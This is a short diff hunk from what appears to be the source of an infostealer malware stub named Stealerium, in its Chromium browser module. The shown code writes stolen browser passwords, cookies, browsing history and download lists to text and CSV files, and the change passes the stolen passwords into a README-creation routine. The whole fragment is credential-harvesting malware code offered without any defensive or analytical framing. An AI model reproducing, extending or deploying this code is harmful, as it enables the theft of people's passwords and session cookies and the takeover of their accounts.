@@ -243,7 +243,7 @@ namespace Stealerium.Stub.Target.Browsers.Chromium
                         CBrowserUtils.WritePasswordsToTxt(pPasswords, sBDir + "\\Passwords.txt");
                         CBrowserUtils.WritePasswordsToCsv(pPasswords, sBDir + "\\Passwords.csv");
                         // Create a README.txt file in the directory
-                        CBrowserUtils.CreateReadme(sBDir);
+                        CBrowserUtils.CreateReadme(sBDir, pPasswords);
                         CBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
                         CBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
                         CBrowserUtils.WriteHistory(pDownloads, sBDir + "\\Downloads.txt");
